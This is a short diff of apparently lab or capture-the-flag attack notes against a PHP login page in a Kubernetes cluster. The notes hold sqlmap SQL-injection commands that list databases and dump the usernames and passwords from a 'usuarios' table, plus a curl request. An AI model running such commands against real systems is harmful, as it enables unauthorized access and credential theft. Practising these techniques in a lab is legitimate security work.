@@ -1,6 +1,6 @@
 sqlmap -u "http://database.default.svc:80/index.php" --data="nombre_usuario=test&password=test" -D empresa_db -T usuarios -C nombre_usuario,password --dump --batch
 
-sqlmap -u "http://10.109.29.143/index.php" --data="nombre_usuario=test&password=test" --dbs --batch
+sqlmap -u "http://database.default.svc:80/index.php" --data="nombre_usuario=test&password=test" --dbs --batch
 
 curl http://10.107.234.118:30000/index.php
 
